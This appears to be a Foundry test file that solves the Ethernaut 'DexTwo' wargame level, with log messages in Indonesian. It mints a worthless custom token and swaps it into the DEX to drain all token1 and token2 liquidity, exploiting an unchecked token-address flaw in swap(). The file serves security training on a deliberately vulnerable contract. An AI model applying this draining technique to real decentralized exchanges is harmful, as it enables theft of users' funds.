// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../24-DexTwo/DexTwoFactory.sol";
import "forge-std/Test.sol";

contract DexTwoAttack is Test {
    function testDexTwo() external {
        vm.createSelectFork(vm.envString("sepolia"));
        Ethernaut ethernaut = new Ethernaut();
        DexTwoFactory factory = new DexTwoFactory();
        ethernaut.registerLevel(factory);
        address trader = makeAddr("trader");
        vm.startPrank(trader, trader);
        address addr = ethernaut.createLevelInstance(factory);
        DexTwo dextwo = DexTwo(addr);
        address token1 = dextwo.token1();
        address token2 = dextwo.token2();
        bool adaLiq = IERC20(token1).balanceOf(address(dextwo)) != 0 && ERC20(token2).balanceOf(address(dextwo)) != 0;
        assertTrue(adaLiq);
        emit log("Goal: menghabiskan semua likuiditas token1 dan token2");
        emit log("=========================================");
        emit log(
            "pada fungsi swap, tidak ada persyaratn token yang diswap harus token1 dan token2\nARtinya kita bisa menggunakan token buatan sendiri untuk diswap"
        );
        TokenMicin micin = new TokenMicin('Token Micin', 'TKM');
        emit log("transfer token micin ke Dex untuk likuiditas");
        // dextwo.add_liquidity(address(micin), 100);
        emit log(
            "ga bisa pake fungsi add_liquidity() karena trader bukan owner dex. Untuk mengakalinya bisa pake erc20.transfer"
        );
        micin.transfer(address(dextwo), 100);
        assertEq(ERC20(token1).balanceOf(trader), 10);
        assertEq(ERC20(token2).balanceOf(trader), 10);
        assertEq(ERC20(address(micin)).balanceOf(trader), 300);
        assertEq(ERC20(token1).balanceOf(address(dextwo)), 100);
        assertEq(ERC20(token2).balanceOf(address(dextwo)), 100);
        assertEq(ERC20(address(micin)).balanceOf(address(dextwo)), 100);
        emit log("Trader: token1(10), token2(10), tokenmicin(300); Dex: token1(100), token2(100), tokenmicin(100)");
        dextwo.approve(address(dextwo), type(uint256).max);
        micin.approve(address(dextwo), type(uint256).max);
        dextwo.swap(address(micin), token1, 100);
        assertEq(ERC20(token1).balanceOf(trader), 110);
        assertEq(ERC20(token2).balanceOf(trader), 10);
        assertEq(ERC20(address(micin)).balanceOf(trader), 200);
        assertEq(ERC20(token1).balanceOf(address(dextwo)), 0);
        assertEq(ERC20(token2).balanceOf(address(dextwo)), 100);
        assertEq(ERC20(address(micin)).balanceOf(address(dextwo)), 200);
        emit log("Trader: token1(110), token2(10), tokenmicin(200); Dex: token1(0), token2(100), tokenmicin(200)");
        dextwo.swap(address(micin), token2, 200);
        assertEq(ERC20(token1).balanceOf(trader), 110);
        assertEq(ERC20(token2).balanceOf(trader), 110);
        assertEq(ERC20(address(micin)).balanceOf(trader), 0);
        assertEq(ERC20(token1).balanceOf(address(dextwo)), 0);
        assertEq(ERC20(token2).balanceOf(address(dextwo)), 0);
        assertEq(ERC20(address(micin)).balanceOf(address(dextwo)), 400);
        emit log("Trader: token1(110), token2(110), tokenmicin(0); Dex: token1(0), token2(0), tokenmicin(400)");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}

contract TokenMicin is ERC20 {
    constructor(string memory nama, string memory simbol) ERC20(nama, simbol) {
        _mint(msg.sender, 400);
    }
}
